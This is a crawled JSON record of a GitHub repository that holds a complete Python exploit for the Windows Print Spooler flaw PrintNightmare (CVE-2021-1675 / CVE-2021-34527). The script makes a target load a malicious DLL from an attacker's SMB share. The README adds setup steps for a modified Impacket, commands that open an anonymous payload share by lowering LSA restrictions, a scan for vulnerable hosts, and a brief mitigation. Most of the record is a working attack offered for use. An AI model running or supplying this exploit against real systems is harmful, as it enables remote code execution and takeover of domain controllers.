{
  "metadata": {
    "timestamp": 1736710953435,
    "page": 612,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjYyMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "cube0x0/CVE-2021-1675",
      "stars": 1854,
      "defaultBranch": "main",
      "files": [
        {
          "name": "CVE-2021-1675.py",
          "type": "blob",
          "size": 8.3486328125,
          "content": "#!/usr/bin/python3\nfrom impacket.dcerpc.v5 import rprn\nfrom impacket.dcerpc.v5 import transport\nfrom impacket.dcerpc.v5.dtypes import NULL\nfrom impacket.structure import Structure\nimport argparse\nimport sys\nimport pathlib\n\n#https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/2825d22e-c5a5-47cd-a216-3e903fd6e030\nclass DRIVER_INFO_2_BLOB(Structure):\n    structure = (\n        ('cVersion','<L'),\n        ('NameOffset', '<L'),\n        ('EnvironmentOffset', '<L'),\n        ('DriverPathOffset', '<L'),\n        ('DataFileOffset', '<L'),\n        ('ConfigFileOffset', '<L'),\n    )\n\n    def __init__(self, data = None):\n        Structure.__init__(self, data = data)\n    \n    def fromString(self, data, offset=0):\n        Structure.fromString(self, data)\n        self['ConfigFileArray'] = self.rawData[self['ConfigFileOffset']+offset:self['DataFileOffset']+offset].decode('utf-16-le')\n        self['DataFileArray'] = self.rawData[self['DataFileOffset']+offset:self['DriverPathOffset']+offset].decode('utf-16-le')\n        self['DriverPathArray'] = self.rawData[self['DriverPathOffset']+offset:self['EnvironmentOffset']+offset].decode('utf-16-le')\n        self['EnvironmentArray'] = self.rawData[self['EnvironmentOffset']+offset:self['NameOffset']+offset].decode('utf-16-le')\n        #self['NameArray'] = self.rawData[self['NameOffset']+offset:len(self.rawData)].decode('utf-16-le')\n\nclass DRIVER_INFO_2_ARRAY(Structure):\n    def __init__(self, data = None, pcReturned = None):\n        Structure.__init__(self, data = data)\n        self['drivers'] = list()\n        remaining = data\n        if data is not None:\n            for i in range(pcReturned):\n                attr = DRIVER_INFO_2_BLOB(remaining)\n                self['drivers'].append(attr)\n                remaining = remaining[len(attr):]\n\ndef connect(username, password, domain, lmhash, nthash, address, port):\n    binding = r'ncacn_np:{0}[\\PIPE\\spoolss]'.format(address)\n    rpctransport = transport.DCERPCTransportFactory(binding)\n    \n    rpctransport.set_dport(port)\n    rpctransport.setRemoteHost(address)\n    \n    if hasattr(rpctransport, 'set_credentials'):\n        # This method exists only for selected protocol sequences.\n        rpctransport.set_credentials(username, password, domain, lmhash, nthash)\n    \n    print(\"[*] Connecting to {0}\".format(binding))\n    try:\n        dce = rpctransport.get_dce_rpc()\n        dce.connect()\n        dce.bind(rprn.MSRPC_UUID_RPRN)\n    except:\n        print(\"[-] Connection Failed\")\n        sys.exit(1)\n    print(\"[+] Bind OK\")\n    return dce\n\n\ndef getDriver(dce, handle=NULL):\n    #get drivers\n    resp = rprn.hRpcEnumPrinterDrivers(dce, pName=handle, pEnvironment=\"Windows x64\\x00\", Level=2)\n    blobs = DRIVER_INFO_2_ARRAY(b''.join(resp['pDrivers']), resp['pcReturned'])\n    for i in blobs['drivers']:\n        if \"filerepository\" in i['DriverPathArray'].lower():\n            return i\n    \n    print(\"[-] Failed to find driver\")\n    sys.exit(1)\n\n\ndef main(dce, pDriverPath, share, handle=NULL):\n    #build DRIVER_CONTAINER package\n    container_info = rprn.DRIVER_CONTAINER()\n    container_info['Level'] = 2\n    container_info['DriverInfo']['tag'] = 2\n    container_info['DriverInfo']['Level2']['cVersion']     = 3\n    container_info['DriverInfo']['Level2']['pName']        = \"1234\\x00\"\n    container_info['DriverInfo']['Level2']['pEnvironment'] = \"Windows x64\\x00\"\n    container_info['DriverInfo']['Level2']['pDriverPath']  = pDriverPath + '\\x00'\n    container_info['DriverInfo']['Level2']['pDataFile']    = \"{0}\\x00\".format(share)\n    container_info['DriverInfo']['Level2']['pConfigFile']  = \"C:\\\\Windows\\\\System32\\\\winhttp.dll\\x00\"\n    \n    flags = rprn.APD_COPY_ALL_FILES | 0x10 | 0x8000\n    filename = share.split(\"\\\\\")[-1]\n\n    resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)\n    print(\"[*] Stage0: {0}\".format(resp['ErrorCode']))\n\n    container_info['DriverInfo']['Level2']['pConfigFile']  = \"C:\\\\Windows\\\\System32\\\\kernelbase.dll\\x00\"\n    for i in range(1, 30):\n        try:\n            container_info['DriverInfo']['Level2']['pConfigFile'] = \"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\x64\\\\3\\\\old\\\\{0}\\\\{1}\\x00\".format(i, filename)\n            resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)\n            print(\"[*] Stage{0}: {1}\".format(i, resp['ErrorCode']))\n            if (resp['ErrorCode'] == 0):\n                print(\"[+] Exploit Completed\")\n                sys.exit()\n        except Exception as e:\n            #print(e)\n            pass\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(add_help = True, description = \"MS-RPRN PrintNightmare CVE-2021-1675 / CVE-2021-34527 implementation.\",formatter_class=argparse.RawDescriptionHelpFormatter,epilog=\"\"\"\nExample;\n./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\\\\\192.168.1.215\\\\smb\\\\addCube.dll'\n./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\\\\\192.168.1.215\\\\smb\\\\addCube.dll' 'C:\\\\Windows\\\\System32\\\\DriverStore\\\\FileRepository\\\\ntprint.inf_amd64_83aa9aebf5dffc96\\\\Amd64\\\\UNIDRV.DLL'\n    \"\"\")\n    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')\n    parser.add_argument('share', action='store', help='Path to DLL. Example \\'\\\\\\\\10.10.10.10\\\\share\\\\evil.dll\\'')\n    parser.add_argument('pDriverPath', action='store', help='Driver path. Example \\'C:\\\\Windows\\\\System32\\\\DriverStore\\\\FileRepository\\\\ntprint.inf_amd64_83aa9aebf5dffc96\\\\Amd64\\\\UNIDRV.DLL\\'', nargs=\"?\")\n    group = parser.add_argument_group('authentication')\n    group.add_argument('-hashes', action=\"store\", metavar = \"LMHASH:NTHASH\", help='NTLM hashes, format is LMHASH:NTHASH')\n    group = parser.add_argument_group('connection')\n    group.add_argument('-target-ip', action='store', metavar=\"ip address\",\n                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '\n                            'This is useful when target is the NetBIOS name and you cannot resolve it')\n    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar=\"destination port\",\n                       help='Destination port to connect to SMB Server')\n\n    if len(sys.argv)==1:\n        parser.print_help()\n        sys.exit(1)\n\n    options = parser.parse_args()\n\n    import re\n    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(\n        options.target).groups('')\n\n    #In case the password contains '@'\n    if '@' in address:\n        password = password + '@' + address.rpartition('@')[0]\n        address = address.rpartition('@')[2]\n\n    if options.target_ip is None:\n        options.target_ip = address\n\n    if domain is None:\n        domain = ''\n\n    if password == '' and username != '' and options.hashes is None:\n        from getpass import getpass\n        password = getpass(\"Password:\")\n\n    if options.hashes is not None:\n        lmhash, nthash = options.hashes.split(':')\n    else:\n        lmhash = ''\n        nthash = ''\n\n    #connect\n    dce = connect(username, password, domain, lmhash, nthash, options.target_ip, options.port)\n    #handle = \"\\\\\\\\{0}\\x00\".format(address)\n    handle = NULL\n\n    #find \"C:\\\\Windows\\\\System32\\\\DriverStore\\\\FileRepository\\\\ntprint.inf_amd64_83aa9aebf5dffc96\\\\Amd64\\\\UNIDRV.DLL\" path\n    if not options.pDriverPath:\n        try:\n            blob = getDriver(dce, handle)\n            pDriverPath = str(pathlib.PureWindowsPath(blob['DriverPathArray']).parent) + '\\\\UNIDRV.DLL'\n            if not \"FileRepository\" in pDriverPath:\n                print(\"[-] pDriverPath {0}, expected :\\\\Windows\\\\System32\\\\DriverStore\\\\FileRepository\\\\.....\".format(pDriverPath))\n                print(\"[-] Specify pDriverPath manually\")\n                sys.exit(1)\n        except Exception as e:\n            print('[-] Failed to enumerate remote pDriverPath')\n            print(str(e))\n            sys.exit(1)\n    else:\n        pDriverPath = options.pDriverPath\n\n    if \"\\\\\\\\\" in options.share:\n        options.share = options.share.replace(\"\\\\\\\\\",\"\\\\??\\\\UNC\\\\\")\n\n    print(\"[+] pDriverPath Found {0}\".format(pDriverPath))\n    print(\"[*] Executing {0}\".format(options.share))\n\n    #re-run if stage0/stageX fails\n    print(\"[*] Try 1...\")\n    main(dce, pDriverPath, options.share)\n    print(\"[*] Try 2...\")\n    main(dce, pDriverPath, options.share)\n    print(\"[*] Try 3...\")\n    main(dce, pDriverPath, options.share)\n"
        },
        {
          "name": "Images",
          "type": "tree",
          "content": null
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 3.64453125,
          "content": "# CVE-2021-1675 / CVE-2021-34527\n\nImpacket implementation of the [PrintNightmare ](https://github.com/afwu/PrintNightmare) PoC originally created by Zhiniang Peng (@edwardzpeng) & Xuefeng Li (@lxf02942370)\n\nTested on a fully patched 2019 Domain Controller\n\nExecute malicious DLL's remote or locally\n\n![](Images/poc2.png)\n\n### Patch update\nMicrosoft has released a patch to mitigate against these attacks but if these values below are present on a machine, then the machine will still be vulnerable\n```\nREG QUERY \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\"\n\nHKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\n    RestrictDriverInstallationToAdministrators    REG_DWORD    0x0\n    NoWarningNoElevationOnInstall    REG_DWORD    0x1\n```\n\n### Installation\n\nBefore running the exploit you need to install my version of Impacket and after that you're gucci\n\n```\npip3 uninstall impacket\ngit clone https://github.com/cube0x0/impacket\ncd impacket\npython3 ./setup.py install\n```\n\n### CVE-2021-1675.py\n\n```\nusage: CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share\n\nCVE-2021-1675 implementation.\n\npositional arguments:\n  target                [[domain/]username[:password]@]<targetName or address>\n  share                 Path to DLL. Example '\\\\10.10.10.10\\share\\evil.dll'\n\noptional arguments:\n  -h, --help            show this help message and exit\n\nauthentication:\n  -hashes LMHASH:NTHASH\n                        NTLM hashes, format is LMHASH:NTHASH\n\nconnection:\n  -target-ip ip address\n                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name\n                        and you cannot resolve it\n  -port [destination port]\n                        Destination port to connect to SMB Server\n\nExample;\n./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll'\n./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\\addCube.dll'\n```\n\n### SMB configuration\n\nEasiest way to host payloads is to use samba and modify `/etc/samba/smb.conf   ` to allow anonymous access\n\n```\n[global]\n    map to guest = Bad User\n    server role = standalone server\n    usershare allow guests = yes\n    idmap config * : backend = tdb\n    smb ports = 445\n\n[smb]\n    comment = Samba\n    path = /tmp/\n    guest ok = yes\n    read only = no\n    browsable = yes\n    force user = smbuser\n```\n\nFrom windows it's also possible\n\n```\nmkdir C:\\share\nicacls C:\\share\\ /T /grant Anonymous` logon:r\nicacls C:\\share\\ /T /grant Everyone:r\nNew-SmbShare -Path C:\\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'\nREG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes\nREG ADD \"HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d share /f\nREG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f\nREG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous /t REG_DWORD /d 0 /f\n# Reboot\n```\n\n### Scanning\n\nWe can use `rpcdump.py` from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable \n\n```bash\nrpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'\n\nProtocol: [MS-PAR]: Print System Asynchronous Remote Protocol \nProtocol: [MS-RPRN]: Print System Remote Protocol\n```\n\n### Mitigation\n\nDisable Spooler service\n\n```powershell\nStop-Service Spooler\nREG ADD  \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Spooler\"  /v \"Start\" /t REG_DWORD /d \"4\" /f\n```\n\n\n\n"
        },
        {
          "name": "SharpPrintNightmare",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}